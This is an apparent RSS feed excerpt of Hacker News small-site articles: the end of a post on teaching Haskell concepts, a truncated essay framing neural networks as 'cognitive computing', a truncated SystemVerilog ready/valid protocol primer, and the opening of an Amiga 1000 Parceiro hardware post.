<p>I am very well aware that very few (none) of the students will pick up Haskell later in their day-to-day life as software engineers, however it is my firm belief that the way this course taught them these concepts, will have made them much better developers, because they have a broader and deeper understanding of them. The main concepts I chose to teach are:</p>
<ul>
<li>
<p><strong>Static Types, immutable data, basic functions</strong>. Dealing with a really strong static type system (yes I know Java is also statically typed but as long as you have dynamic dispatch there is some runtime-type information around…), immutable data and pure functions is a challenge on its own, forcing the students to think very different about what they know so far.</p>
</li>
<li>
<p><strong>Explicit Recursion</strong>. No more mutable data, therefore we employ recursion instead of iteration and in-place memory updates. To think recursively takes a while but is probably among the most important abilities for computer scientists and it can never hurt to reiterate it.</p>
</li>
<li>
<p><strong>Higher-Order Functions</strong>. Probably the most essential concept to learn in this pure form in Haskell. The way it works in Haskell in combination with Currying and Lambdas is tremendously powerful, which is also realised by students. This concept has entered mainstream OO languages by now, therefore students are able to pick it up quickly and see why it is useful.</p>
</li>
<li>
<p><strong>Lambdas</strong>. Have arrived in mainstream OO as well and students quickly understand the use of anonymous functions to write concise code.</p>
</li>
<li>
<p><strong>Currying</strong>. Tremendously powerful concept, not available in this form in mainstream OO - yes you can hack a workaround which looks like currying but the way it comes across in Haskell is simply beautiful. When telling students that it can be understood as <em>Dependency Injection</em> the penny drops.</p>
</li>
<li>
<p><strong>Data Definitions</strong>. How can we define data types when there are no objects? ADTs is a very valuable lesson to learn, especially to teach recursive data types.</p>
</li>
<li>
<p><strong>Pattern Matching</strong>. Probably the most elegant feature of functional programming in general and invaluable to write concise recursive functions. It is still a mystery to me why Java has not properly implemented pattern matching yet.</p>
</li>
<li>
<p><strong>Lazy Evaluation</strong>. The concept of separating the producer from the consumer is extremely powerful and important on its own, left alone infinite data structures and functions on them. These concepts can be emulated to some extent in OO languages (for example with an <em>Iterator</em> or <em>Streams</em>), however it is nowhere as compelling and pure as in Haskell.</p>
</li>
<li>
<p><strong>Type Classes</strong>. To show students that polymorphism is <strong>not</strong> a unique feature of OO but that it is a fundamental concept allowing to express abstract concepts, facilitating code reuse (among others) and allows to express laws and concepts of a specific type. Students generally understand Type Classes as <em>a kind of interface</em> (in Java terms), which is fine for me and not far from the truth.</p>
</li>
<li>
<p><strong>Functors</strong>. Seeing how to apply already existing functions on types with some structure is a valuable insight. However I do not go too much into the “theory” and leave it at <em>a type with some structure which can be mapped over</em> - this generally blows the students mind anyway.</p>
</li>
<li>
<p><strong>Applicatives</strong>. Probably one of the hardest sells, I motivate it basically through <em>currying within a functor</em>. It is there, where students <em>should</em> get a glimpse what effectful programming means and how it can be achieved in a pure functional language.</p>
</li>
<li>
<p><strong>Foldable and Monoids</strong>. Getting more abstract, but folds and monoids have entered mainstream OO in functional stream processing, so students understand that it <strong>is</strong> useful. However the reductionist way that Haskell captures these concepts is perfect to explain it from first principles. Also I think every computer science student should know and understand what a <em>Monoid</em> is.</p>
</li>
<li>
<p><strong>Monads</strong>. I spend quite a lot of time building up to and motivating Monads as they capture everything learned so far and allow me then to talk about IO, Concurrency, STM and Property-Based Testing all of which build on Monads in some way. I am not using the do-notation straight away but am forcing them down the way along the »= operator to make it <strong>really</strong> explicit. The main point I make and I discuss at length here (and in IO) is <em>side effects</em>. When you come from a mainstream OO language, your idea about side effects is rather implicit and you have probably not thought about it in such an explicit way as you were forced to when dealing with it in Haskell. This is what I subject the students to and I think it is absolutely worth it: being more explicit about side effects in your thinking, reasoning and your code ultimately leads to better developers and better code.</p>
</li>
<li>
<p><strong>IO</strong> (and do-notation). After pestering the students with explicit »= I show them the do-notation and how to do “real-world” stuff with IO. At this point this is a huge relief for them as they have been wondering for some time now where the promised real-world applicability of Haskell is. The more important insight I discuss and students take away from this is that there are “impure uncontrollable” (IO) and “pure, controllable” (previous Monads) side effects - again this will broaden their horizon and allows them to think even more explicitly and detailed about side effects.</p>
</li>
<li>
<p><strong>Concurrency</strong>. Is generally a very poorly treated topic in CS studies. Students learn how easy it is to write concurrent programs in Haskell using <em>IORef</em>, <em>MVar</em> and <em>Async/Wait</em>.</p>
</li>
<li>
<p><strong>STM</strong>. To show students a very different approach to concurrency, making another showcase for the amazing type system of Haskell and how it deals with side effects.</p>
</li>
<li>
<p><strong>Property-Based Testing</strong>. To show students that there is more than tedious <em>Unit Tests</em> (they should be already familiar with). Expressing functional specifications directly in code blows their mind.</p>
</li>
<li>
<p><strong>Dependent Types</strong>. Going beyond Haskell and showing them whats next and what extremely powerful concepts are lurking in Dependent Types (I am using Idris): Types as 1st class Citizen, Totality, Programs as Proofs, Dependent Functions, Dependent Pairs, Equality as Type, Philosophical Foundations. So students have a rough idea what is possible but which will take decades to arrive in mainstream (if at all).</p>
</li>
</ul>
<p>What about the future of the course?
I can imagine that I am going to try out teaching Erlang in this course instead of Haskell and see how it goes down - or Rust - or Scala - or Clojure. Each of these languages has unique concepts and also allows to cover a few of the concepts I am teaching with Haskell. However, the problem is that to teach a language and its concepts you need to have a sufficiently deep understanding and also experience in each language. Unfortunately I can only say that about Haskell, Erlang and Java and I would need to fully and deeply learn other languages if I aim on teaching them. Unfortunately I doubt that I will have the time for that undertaking as it is substantial, therefore I will probably continue with Haskell as it is the language I am very familiar with and will stick with for the next years for real-world software engineering research. Still, just to get some fresh air into the course I think at one point I will try to go with Erlang or Elixir, which would also allow me to capture OO concepts from a functional perspective (how we can emulate subtyping with actors for example).</p>

    </article></div>]]>
            </description>
            <link>http://www.lambdabytes.io/posts/teachinghaskell/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25818697</guid>
            <pubDate>Mon, 18 Jan 2021 06:06:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The long future of artificial intelligence]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25818491">thread link</a>) | @KhoomeiK
<br/>
January 17, 2021 | https://thesephist.com/posts/ai/ | <a href="https://web.archive.org/web/*/https://thesephist.com/posts/ai/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <blockquote>
<p>The brain is waking and with it the mind is returning. It is as if the Milky Way entered upon some cosmic dance. Swiftly the head mass becomes an enchanted loom where millions of flashing shuttles weave a dissolving pattern, always a meaningful pattern though never an abiding one; a shifting harmony of subpatterns.</p>
<p>Charles S. Sherrington, <em>Man on his Nature</em>, 1940</p>
</blockquote>
<p>When Sherrington described the human brain as the <em>enchanted loom</em> in the mid-20th century, the <a href="https://en.wikipedia.org/wiki/Jacquard_machine">Jacquard loom</a> featured in his prose had been one of the most complex mechanical devices ever invented for over a hundred years. It used a system of punched cards that encoded complex patterns to be weaved into textile. The punched cards devised for the Jacquard loom would later find wider use in early computers, also programmed with punchcards. This is where software was born.</p>
<p>Given the place the Jacquard loom held in the history of mechanical craftsmanship, it’s no surprise that Sherrington imagined the human brain, still the most complex system we know of in the universe, as a system of looms weaving ephemeral patterns into memories and cognition.</p>
<p>Decades have passed, and the complexity of microprocessors used in Internet-scale computing systems dwarf the complexity of even the largest Jacquard patterns. Today, we imagine usurping the capabilities of the human brain with software instead of looms.</p>
<p>We’ve gotten closer, but I’m not sure that computers as we know it will get us there yet. Inventing the computer and the deep neural network may still be one of the first few steps in replicating the magic of the <em>enchanted loom</em>, and in this post, I want to explore the future that I imagine in our steps forward.</p>
<h2 id="a-new-kind-of-computer">A new kind of computer</h2>
<p>I firmly believe that deep neural networks represent a fundamentally <em>different kind of tool</em> than computers as we’ve known them since their invention.</p>
<p>Programs that run on conventional computers that aren’t neural nets – a class of programs I’ll call “classical computing” – are all built on the same fundamental conceptual foundation: the ability to emulate Turing machines efficiently.</p>
<p>The <a href="https://en.wikipedia.org/wiki/Turing_machine">Turing machine</a> is an abstract model of what it means to “compute” something. The model has a small machine working with a limited set of rules along an infinite tape of “memory” on which it can read and write data, and computer scientists consider the Turing machine the de-facto model for the <em>capability</em> that a computer has. This means that any classical program we can write for a computer can be re-written as a program fed into a Turing machine. All modern computers, from your smartphone and laptop to servers in Google’s datacenters to the microcontroller in your thermostat, are built on this foundational capability of <em>emulating a Turing machine</em>, and thus being able to solve the same problems a Turing machine can theoretically solve.</p>
<p>This is the reason that a program written for one computer can be safely re-written for another computer, and an algorithm designed for one programming language can be re-written in another language. All of these tools and computers encode the same powerful problem-solving power, which is the computational capability that a Turing machine represents. This capability includes things like efficient arithmetic, simulation, and working with strings of data, and these capabilities of the Turing machine turn out to unlock a whole world of power for users of computers – the power we enjoy today on our personal devices.</p>
<p>The Turing machine encodes a particular <em>class of problems</em> that classical computers can solve. But there are problems that are intractable for even the fastest, most efficient Turing machines, problems like factoring large prime numbers, infinite-precision decimal arithmetic, and the traveling-salesman problem. We depend on the intractability of some of these problems for the security of modern cryptography.</p>
<p>But just because these problems are impenetrable to computers based on Turing machines, doesn’t mean the are impossible problems. For example, a classical computer can’t work with infinite-precision decimal numbers, because they have finite memory. But we humans can trivially work with infinite-precision quantities, by using geometry. If you wanted me to tell you the exact value of the golden ratio, an irrational number, I could <a href="https://en.wikipedia.org/wiki/Golden_rectangle#Construction">construct a geometric representation</a> for you with a pencil, a ruler, and a compass, and you could measure it to any desired level of precision. Turing machine-based computers are powerful, but their power has limits.</p>
<p>Classical computers, like the one you have in your pocket or the one on which you’re reading this post, give us the <em>computational capability</em> to solve a specific class of problems. There are other <em>kinds of computers</em> that unlock the ability to solve other kinds of problems that are intractable for the computers we’re used to.</p>
<p>Astute readers will already know one such example of a new kind of computer: the quantum computer. Quantum computers don’t operate on the Turing machine model. Instead, the equivalent concept – the “quantum Turing machine” – encodes the total computational power of quantum computers in a mathematical model. Quantum computers give us a new kind of <em>computational capability</em>, namely the ability to run algorithms over a whole range of possible values, rather than a single value as in a classical computer. Using this new capability, we can attack new kinds of problems previously intractable for a Turing machine-based computer, like factoring large prime numbers, which is possible on a quantum computer using <a href="https://en.wikipedia.org/wiki/Shor's_algorithm">Shor’s algorithm</a>.</p>
<p>In summary, there exist <a href="https://linus.coffee/note/computing/">different computational capabilities</a>, defined by the kinds of problems we can solve with each particular model of computing. Two examples are classical computers, emulating a Turing machine, and quantum computers, operating on a state space of values rather than single pieces of data.</p>
<p>Deep neural nets, I think, represent a third kind of computational capability.</p>
<h2 id="the-turing-machine-for-cognition">The Turing machine for cognition</h2>
<p>Training and making predictions with a deep neural net <em>can</em> run on a classical computer (as they almost always do today), but the operations that comprise computation with a neural net aren’t the atoms of Turing machines, but something different. They’re large, massively multi-dimensional matrix multiplications calculating weights and differentials across huge numbers of values at once in uniform ways. This fundamentally different computation model is what makes DNNs so well-suited to run on parallel processors like GPUs. But beyond that simple acceleration, we’ve been inventing new computing hardware for deep neural nets for a while now, better suited to the kinds of computational work required for a neural net. We’ve invented new kinds of processors (tensor processors), new kinds of data representations (bfloat16, reduced-precision floats), and alternative ways of writing programs (dataflow graphs) that are better suited to this new kind of computational power.</p>
<p>I think this suggests that <strong>deep neural nets represent a fundamentally new computational capability</strong>, different from classical computing that run sequentially on CPUs and efficiently emulate Turing machines. I’ll call this new capability <strong>cognitive computing</strong> to contrast with classical computing and quantum computing. Deep neural network-based software systems aren’t about emulating Turing machines or running algorithms designed for classical computers. Instead, they give computers the ability to solve new kinds of problems that resemble cognition.</p>
<p>Like quantum computers, DNNs open up a new, previously intractable class of problems for computers. These problems generally look like <em>cognitive or perceptive tasks</em>, things like learning the rules of an unknown system, recognizing patterns in data, breaking down images and text into sensible parts, and making inferences based on past patterns.</p>
<p>“But Linus,” you might object to this idea, “if deep neural nets really represent a new kind of computational capability, how can we run them on classical computers?”</p>
<p>Excellent question.</p>
<h2 id="beyond-vacuum-tubes">Beyond vacuum tubes</h2>
<p>Even though cognitive and quantum computing represent different kinds of computational power, they aren’t completely inaccessible to each other. For example, it’s possible for fast classical computers, like the CPU in your laptop, to simulate a small quantum computer, albeit very slowly and inefficiently. But because a classical computer simulating a quantum computer has to keep track of exponentially more data, large quantum problems for which quantum computers are useful are impractical to simulate on a classical computer. (And by “impractical” I mean that constructing a computer capable of it would require more atoms that exist in the universe.)</p>
<p>When we run cognitive algorithms on deep neural nets on GPUs and tensor processors today inside our classical computers, we’re doing something akin to simulating quantum computers inside classical ones. We’re taking a massive hit in efficiency, for the benefit that we already know how to work with classical computers! But to really take advantage of the best that DNNs can offer humanity, we’ll need more efficient and DNN-friendly <em>computational substrates</em>.</p>
<h3 id="computing-capabilities-computing-substrates">Computing capabilities, computing substrates</h3>
<p>In the possibility space of computers, there are two axes: capabilities and substrates. A computational <em>capability</em> describes the kinds of problems that a computer can solve: quantum algorithms, deep learning algorithms, basic arithmetic, and so on. A computational <em>substrate</em> is the physical material on which the algorithm runs: paper-and-pen, vacuum tubes, microprocessors, ion atoms, GPUs, and so on.</p>
<p>For each computational capability, there are many, many substrates on which we can execute the same algorithms. The first computers that ran on vacuum tubes can theoretically run the same programs that my iPhone 12 runs today, even though they use different substrates under the hood, because they implement the same computational …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thesephist.com/posts/ai/">https://thesephist.com/posts/ai/</a></em></p>]]>
            </description>
            <link>https://thesephist.com/posts/ai/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25818491</guid>
            <pubDate>Mon, 18 Jan 2021 05:27:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ready/Valid Protocol Primer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25818488">thread link</a>) | @fahayek
<br/>
January 17, 2021 | http://www.cjdrake.com/readyvalid-protocol-primer.html#readyvalid-protocol-primer | <a href="https://web.archive.org/web/*/http://www.cjdrake.com/readyvalid-protocol-primer.html#readyvalid-protocol-primer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="introduction">
<h2>Introduction</h2>
<p>In digital logic design,
the ready/valid protocol is a simple and common handshake process for one component to transmit
data to another component in the same clock domain.
Every FIFO implements a version of this protocol on its ports,
whether the signals are called "ready/valid", or "full/push" and "pop/empty".
Also, ready/valid signals are used as the flow control mechanism for every channel of the
popular AMBA AXI high performance on-chip interconnect.</p>
<p>Despite its ubiquitous application, there is no de-facto standard implementation.
Engineers routinely implement ad-hoc ready/valid logic in every codebase they work with.
In this primer, we will describe the protocol in detail,
propose standard naming conventions,
and write some reusable SystemVerilog interface code to bolster design verification.</p>
<p>The code we will write is not advanced,
but familiarity with SystemVerilog Assertions (SVA) will be helpful.</p>
</div><div id="protocol-description">
<h2>Protocol Description</h2>
<p>Assume we have two components in a hardware design with a unidirectional data flow.
A "Transmitter" (Tx) sends data to a "Receiver" (Rx).
The Transmitter and Receiver are equal partners in this data exchange.
That is, the Transmitter cannot force the Receiver to consume data,
and the Receiver cannot force the Transmitter to produce data.
For a transfer of data to happen,
the two sides need to "shake hands".
The Transmitter needs to have "valid" data,
and the Receiver needs to be "ready" to receive the data.</p>
<p>Figure 1 shows a block diagram of the basic ready/valid/data components.
Note that the "ready" and "valid" signals are single wires,
but the "data" signal is a bus composed of multiple wires transmitting in parallel.</p>
<div>
<p><strong>Figure 1:</strong> Data Transmitter and Receiver</p>
</div>
<div id="aside-regarding-component-names">
<h3>Aside Regarding Component Names</h3>
<p>Phil Karlton <a href="https://www.karlton.org/2017/12/naming-things-hard/">once said</a>
"there are only two hard things in Computer Science: cache invalidation and naming things."
The book
<a href="https://www.springer.com/gp/book/9781461443001">Microarchitecture of Network-on-Chip Routers</a>
uses the terms "sender" and receiver".
The <a href="https://developer.arm.com/documentation/ihi0022/d/">AMBA Specification</a>
uses the terms "source" and "destination", or "master" and "slave".
I have seen other documents use terms such as "producer" and "consumer", and so on.</p>
<p>I have arbitrarily chosen the names "Transmitter" and "Receiver" because</p>
<ul>
<li>they are unambiguous - one transmits data, the other receives it</li>
<li>they are commonly used in digital signal processing (DSP)</li>
<li>they both have the same number of syllables</li>
<li>I like the "Tx" and "Rx" abbreviations</li>
</ul>
</div>
<div id="link-state">
<h3>Link State</h3>
<p>Since there are two control bits,
the link can be in four possible states.
We will name those states according to the following table.</p>
<table>
<colgroup>
<col width="19%">
<col width="11%">
<col width="11%">
<col width="59%">
</colgroup>
<thead>
<tr><th>State Name</th>
<th>ready</th>
<th>valid</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr><td><strong>Idle</strong></td>
<td>0</td>
<td>0</td>
<td>Transmitter does not have valid data.</td>
</tr>
<tr><td><strong>Wait</strong>
<strong>for</strong>
<strong>Ready</strong></td>
<td>0</td>
<td>1</td>
<td>Transmitter has valid data,
but Receiver is not ready for it.
Data will <strong>NOT</strong> be transferred.</td>
</tr>
<tr><td><strong>Wait</strong>
<strong>for</strong>
<strong>Valid</strong></td>
<td>1</td>
<td>0</td>
<td>Receiver is ready for data,
but transmitter has none.</td>
</tr>
<tr><td><strong>Transfer</strong></td>
<td>1</td>
<td>1</td>
<td>Transmitter has valid data,
and Receiver is ready for it.
Data will be transferred.</td>
</tr>
</tbody>
</table>
<p>According to the <a href="https://developer.arm.com/documentation/ihi0022/d/">AMBA Specification</a>,
section A.3.2.1,
there are two rules governing ready/valid behavior:</p>
<ul>
<li>A transmitter is not permitted to wait until READY is asserted before asserting VALID.</li>
<li>Once VALID is asserted it must remain asserted until the handshake occurs,
at a rising clock edge at which VALID and READY are both asserted.</li>
</ul>
<p>The first rule is a performance requirement.
To achieve full bandwidth on the link,
the ready and valid signals must be independent.</p>
<p>The second rule places a restriction on exiting the <strong>Wait for Ready</strong> state.
Once the transmitter has valid data, it is illegal to renege on the transfer.
It must wait until the receiver is ready for it.</p>
<p>AMBA does <strong>not</strong> restrict whether the ready signal is allowed to assert and later
deassert without a handshake.
However, some implementations may desire this extra level of strictness.
For example, a FIFO is "ready" when it has a slot available.
If it ever deasserted its ready signal without a data push,
that would be a serious error that we need to uncover.
I will refer to this extra strict version of the protocol as the "stable ready" requirement.</p>
<p>Figure 2 shows the legal state transitions.</p>
<div>
<p><strong>Figure 2:</strong> Ready/Valid Link State</p>
</div>
<p>For the less strict version of the protocol with no stable ready requirement,
we can effectively merge the <strong>Idle</strong> and <strong>Wait for Valid</strong> states, marked in red.</p>
<p>For the more strict version of the protocol with stable ready requirement,
we can remove the arrows marked in red.
Both of the <strong>Wait for ...</strong> states may only transition to <strong>Transfer</strong> state.</p>
<p>We will formalize these rules a little later with SystemVerilog assertions.</p>
</div>
<div id="link-signal-timing">
<h3>Link Signal Timing</h3>
<p>Figure 3 shows a timing diagram of three data words being transferred.
The style of the waveform mimics debuggers such as
<a href="https://www.synopsys.com/verification/debug/verdi.html">Verdi</a> and
<a href="https://www.cadence.com/en_US/home/tools/system-design-and-verification/debug-analysis/simvision-debug.html">Simvision</a>.
Signals are driven immediately after the clock edge with no visible delay.
The upward arrows on the <tt>clock</tt> signal indicate clock edges when data transfer events occur.</p>
<div>
<p><strong>Figure 3:</strong> Ready/Valid Protocol Waveform Debugger View</p>
</div>
<p>For convenience, the follow table summarizes the events:</p>
<table>
<caption>Transfer Three Words of Data</caption>
<colgroup>
<col width="7%">
<col width="29%">
<col width="29%">
<col width="36%">
</colgroup>
<thead>
<tr><th>Time</th>
<th>Receiver Ready?</th>
<th>Transmitter Valid?</th>
<th>State</th>
</tr>
</thead>
<tbody>
<tr><td>1</td>
<td>No</td>
<td>No</td>
<td>Idle</td>
</tr>
<tr><td>2</td>
<td>No</td>
<td>Yes</td>
<td>WaitForReady</td>
</tr>
<tr><td>3</td>
<td>Yes</td>
<td>Yes</td>
<td>Transfer Word #1</td>
</tr>
<tr><td>4</td>
<td>Yes</td>
<td>No</td>
<td>WaitForValid</td>
</tr>
<tr><td>5</td>
<td>Yes</td>
<td>Yes</td>
<td>Transfer Word #2</td>
</tr>
<tr><td>6</td>
<td>Yes</td>
<td>Yes</td>
<td>Transfer Word #3</td>
</tr>
<tr><td>7</td>
<td>Yes</td>
<td>No</td>
<td>WaitForValid</td>
</tr>
</tbody>
</table>
</div>
<div id="aside-regarding-waveform-perspective">
<h3>Aside Regarding Waveform Perspective</h3>
<p>When analyzing logical protocols that are implemented using real-world,
analog technologies such as wires and transistors,
we need to draw the waveform diagram with appropriate propagation delays.
Unfortunately, there is no standard frame of reference for the link.</p>
<p>Figure 4 shows a more realistic representation of Figure 3,
but from the perspective of the Transmitter.
Notice that the ready signal arrives late.</p>
<div>
<p><strong>Figure 4:</strong> Ready/Valid Protocol Transmit Perspective View</p>
</div>
<p>Figure 5 shows a similarly realistic representation of Figure 3,
but this time from the perspective of the Receiver.
Notice that the valid/data signals arrive late.</p>
<div>
<p><strong>Figure 5:</strong> Ready/Valid Protocol Receive Perspective View</p>
</div>
<p>These diagrams help visualize important implementation details.
For example,
the designer of the Transmitter should avoid adding significant logic to the <tt>ready</tt> input,
because it might violate the setup time.</p>
<p>In addition,
considering the handshake signal propagation delays can clarify their meaning.
When the Receiver drives <tt>ready=1</tt> onto the wire,
it does not yet know whether the Transmitter will send data.
In plain English, it sends the message:
"if you transmit data on this cycle, I am ready for it".
Similary, when the Transmitter drives <tt>valid=1</tt> onto the wire,
it sends the message:
"if you are ready, I will transmit this data to you".
Both the <tt>ready</tt> and <tt>valid</tt> signals contain propositional logic that can only be satisfied
after the signal propagation delay.</p>
</div>
</div><div id="interface-implementation-conventions">
<h2>Interface Implementation Conventions</h2>
<p>When using ready/valid interfaces in SystemVerilog code,
bundle the signals together and use a consistent naming convention.
Different projects have different rules,
but I recommend at least the following:</p>
<ol>
<li>Order the ready/valid/data signals consistently</li>
<li>Use a common interface name prefix</li>
<li>Use standard ready/valid/data name suffixes</li>
</ol>
<p>For example, here is a good module parameter/port list for a generic FIFO.</p>
<div><pre><span></span><span>module</span> <span>Fifo</span> <span>#(</span>
    <span>parameter</span> <span>type</span> <span>T</span> <span>=</span> <span>logic</span> <span>[</span><span>7</span><span>:</span><span>0</span><span>]</span>
<span>)</span> <span>(</span>
    <span>// Read Port</span>
    <span>input</span>  <span>logic</span> <span>read_ready</span><span>,</span>
    <span>output</span> <span>logic</span> <span>read_valid</span><span>,</span>
    <span>output</span> <span>T</span>     <span>read_data</span><span>,</span>

    <span>// Write Port</span>
    <span>output</span> <span>logic</span> <span>write_ready</span><span>,</span>
    <span>input</span>  <span>logic</span> <span>write_valid</span><span>,</span>
    <span>input</span>  <span>T</span>     <span>write_data</span><span>,</span>

    <span>input</span> <span>logic</span> <span>clock</span><span>,</span>
    <span>input</span> <span>logic</span> <span>reset</span>
<span>);</span>
    <span>...</span>
<span>endmodule</span> <span>:</span> <span>Fifo</span>
</pre></div>
<p>A module may have several ready/valid interfaces for several purposes.
In order to find them quickly using a command line grep or debugger glob pattern match,
all members of an interface bundle should have a common prefix.
This particular FIFO has a read and write port,
which are given <tt>'read_'</tt>, and <tt>'write_'</tt> prefixes, respectively.</p>
<p>Use the standard suffix names <tt>'_ready'</tt>, <tt>'_valid'</tt>, and <tt>'_data'</tt>.
Do not use clever abbreviations like <tt>'_rdy'</tt>, and <tt>'_vld'</tt>.
Do not sacrifice clarity for brevity.
The AMBA specification does not abbreviate these signals names; neither should we.</p>
<p>Also, do not use port direction naming conventions such as <tt>'_o'</tt> for "output"
and <tt>'_i'</tt> for "input".
It should be obvious to the reader which signals are inputs and outputs.
For example,
a FIFO's write port should have <tt>'valid'</tt> and <tt>'data'</tt> inputs.</p>
<p>Do not use a SystemVerilog <tt>interface</tt> to implement the ports.
SV interfaces provide ergonomic benefit for passing around large bundles of signals,
but they will end up costing more in tool support and maintenance issues than they ever pay
in benenfits for a collection of only three signals.
Reserve usage of interfaces for verification components such as UVM agents.</p>
</div><div id="formal-checks">
<h2>Formal Checks</h2>
<p>SystemVerilog assertions are one of the most productive ways of finding and fixing logical errors
and coverage holes.
In this section,
we will write a standard suite of ready/valid protocol assertions that can be copied and pasted
for every interface instance.</p>
<p>Before delving into the implementation details,
to reduce the amount of boilerplate required to write concurrent assumptions,
assertions, and cover properties,
we will first define three text replacement preprocessor macros.
For background on this best practice, read section 8 of
<a href="http://www.sunburst-design.com/papers/CummingsSNUG2016SV_SVA_Best_Practices.pdf">SystemVerilog Assertions Bindfiles &amp; Best Known Practices for Simple SVA Usage</a>,
presented at Synopsys User Group (SNUG) 2016.</p>
<div><pre><span></span><span>`define</span> <span>ASSUME</span><span>(</span><span>name</span><span>,</span> <span>expr</span><span>,</span> <span>clock</span><span>,</span> <span>reset</span><span>)</span> \
<span>name:</span> <span>assume</span> <span>property</span> <span>(</span> \
    <span>@(</span><span>posedge</span> <span>clock</span><span>)</span> <span>disable</span> <span>iff</span> <span>(</span><span>reset</span><span>)</span> <span>(</span><span>expr</span><span>)</span> \
<span>);</span>

<span>`define</span> <span>ASSERT</span><span>(</span><span>name</span><span>,</span> <span>expr</span><span>,</span> <span>clock</span><span>,</span> <span>reset</span><span>)</span> \
<span>name:</span> <span>assert</span> <span>property</span> <span>(</span> \
    <span>@(</span><span>posedge</span> <span>clock</span><span>)</span> <span>disable</span> <span>iff</span> <span>(</span><span>reset</span><span>)</span> <span>(</span><span>expr</span><span>)</span> \
<span>);</span>

<span>`define</span> <span>COVER</span><span>(</span><span>name</span><span>,</span> <span>expr</span><span>,</span> <span>clock</span><span>,</span> <span>reset</span><span>)</span> \
<span>name:</span> <span>cover</span> <span>property</span> <span>(</span> \
    <span>@(</span><span>posedge</span> <span>clock</span><span>)</span> <span>disable</span> <span>iff</span> <span>(</span><span>reset</span><span>)</span> <span>(</span><span>expr</span><span>)</span> \
<span>);</span>
</pre></div>
<p>Different tools treat assumptions, assertions, and cover properties differently.
For example, for simulators there is no difference between an
assumption and an assertion -- they are both just dynamic checks.
Formal verification (FV) tools, on the other hand,
create logic proofs using assertions,
and …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.cjdrake.com/readyvalid-protocol-primer.html#readyvalid-protocol-primer">http://www.cjdrake.com/readyvalid-protocol-primer.html#readyvalid-protocol-primer</a></em></p>]]>
            </description>
            <link>http://www.cjdrake.com/readyvalid-protocol-primer.html#readyvalid-protocol-primer</link>
            <guid isPermaLink="false">hacker-news-small-sites-25818488</guid>
            <pubDate>Mon, 18 Jan 2021 05:27:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Amiga 1000 Parceiro]]>
            </title>
            <description>
<![CDATA[
Score 84 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25818159">thread link</a>) | @jdkee
<br/>
January 17, 2021 | https://www.amigalove.com/viewtopic.php?t=1689 | <a href="https://web.archive.org/web/*/https://www.amigalove.com/viewtopic.php?t=1689">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><iframe width="560" height="315" src="https://www.youtube.com/embed/b0yBg6s99F0" frameborder="0" allowfullscreen=""></iframe></p>

<p><em>If you’d like to get an Amiga Parceiro for yourself, I explain how you can pre-order one at a heavily discounted rate at the end of the video and this article.</em></p><p>


A couple of years ago I made some videos where I showed my favorite Amiga 1000 setup at that time. It had two main hardware super powers that made it my daily driver. </p><p>

First, a fly-by of a glorious <a href="https://youtu.be/ZmW6LEwgruE">Rejuvenator board</a>, designed by the late Greg Tibbs out of Ohio (RIP Greg). A local good friend of mine here in Seattle named Christian Stich helped me upgrade that board to utilize a rare A3000 Agnus I found that can use 2MB of Chip RAM, which he custom built adapters for it to use. It also has a Kickstart 1.3 ROM chip to accelerate the boot up process and lose the typical Kickstart floppy. </p><div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6147&amp;sid=56223327f665c54364df1dd74cc11fa5" alt="IMG_7827.jpg" onclick="viewableArea(this);"></dt>
						<!-- <dd>IMG_7827.jpg (278.04 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6148&amp;sid=56223327f665c54364df1dd74cc11fa5" alt="IMG_7842.jpg" onclick="viewableArea(this);"></dt>
						<!-- <dd>IMG_7842.jpg (275.15 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<p><em>Christian here is removing the old DRAMs, which were eight 256Kx4 in DIP format. He then installed four custom 1Mx4 in SOJ format  DRAMs with an adapter board that converts them to DIP format.</em></p><p>


The second thing was a hardware combo where I used a Microbotics Starboard expansion made back in 1987 that provided both extra fast RAM (in this case 1Mb), a real-time clock, and a SCSI module called the <a href="https://youtu.be/6BLXxY7FG5M">StarDrive which allowed me to use an Iomega SCSI Zip</a> as an external 100 MB hard drive. It used a custom Workbench boot disk that would pass control from the floppy over to the Zip drive and essentially turn the Zip into a semi-autobooting hard drive, which was a total game changer for that system. For all intents and purposes, that Amiga 1000 became one of my favorite, most treasured systems in my entire Amiga collection. </p><p>

<strong>A1000 equipped Starboard with SCSI Zip 100 as a hard drive </strong></p><p><iframe width="560" height="315" src="https://www.youtube.com/embed/6BLXxY7FG5M" frameborder="0" allowfullscreen=""></iframe></p>

<p>
Fast-forward to today, as I made the difficult decision to <em>remove</em> the Starboard and Zip drive and replace it with a brand new device called the <strong>Amiga Parceiro</strong>. (Parceiro in Portuguese means “partner”.) So it’s the Friend Partner. <img src="https://www.amigalove.com/images/smilies/icon_e_wink.gif" width="15" height="17" alt=";)" title="Wink"></p><p>

The Amiga Parceiro was invented over the course of the past year by an Amiga hobbyist named David Dunklee who resides in a small town outside of Colorado Springs, CO. </p><p>

As Dunklee puts it:</p><div>

	
		
		

				<dl>
			<dt><img src="https://www.amigalove.com/download/file.php?id=6149&amp;sid=56223327f665c54364df1dd74cc11fa5" alt="DDunklee.png" onclick="viewableArea(this);"></dt>
						<!-- <dd>DDunklee.png (152.05 KiB) </dd>-->
		</dl>
		
		


		
		
	
</div>

<p>
